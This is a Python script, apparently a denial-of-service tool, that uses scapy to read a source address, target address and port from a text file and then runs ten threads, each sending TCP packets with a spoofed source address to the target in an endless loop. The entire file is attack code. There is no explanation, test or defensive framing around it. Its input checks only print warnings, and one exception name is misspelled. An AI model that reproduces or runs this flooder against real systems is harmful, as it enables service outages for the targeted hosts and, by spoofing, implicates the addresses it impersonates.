from scapy.all import *
from threading import Thread
import ipaddress
threads = 10
srcport=50576

with open("dos_ip.txt",'r') as script:
    ip_port = list(script.read().split(','))

    src = ip_port[0]
    target = ip_port[1]
    port = int(ip_port[2])

    for line in ip_port:
        print(line)
    try:
        ipaddress.ip_address(src)
    except ValueError:
        print("That is not a valid IP address.")

    try:
        ipaddress.ip_address(target)
    except ValueErrror:
        print("That is not a valid IP address.")

    if len(ip_port[2]) < 6 and port < 65536 and port > 0:
        pass
    else:
        print("That is not a valid port number.")

def attack():
    i=1
    while True:
        IP1 = IP(src=src, dst=target)
        TCP1 = TCP(sport=srcport, dport=port)
        pkt = IP1 / TCP1
        send(pkt,inter= .001)
        print("packet sent ", i)
        i=i+1

def multithreaded():
    jobs = []
    for i in range(0, threads):
        thread = Thread(target=attack)
        jobs.append(thread)
    for j in jobs:
        j.start()
    for j in jobs:
        j.join()
if __name__ =="__main__":
    multithreaded()


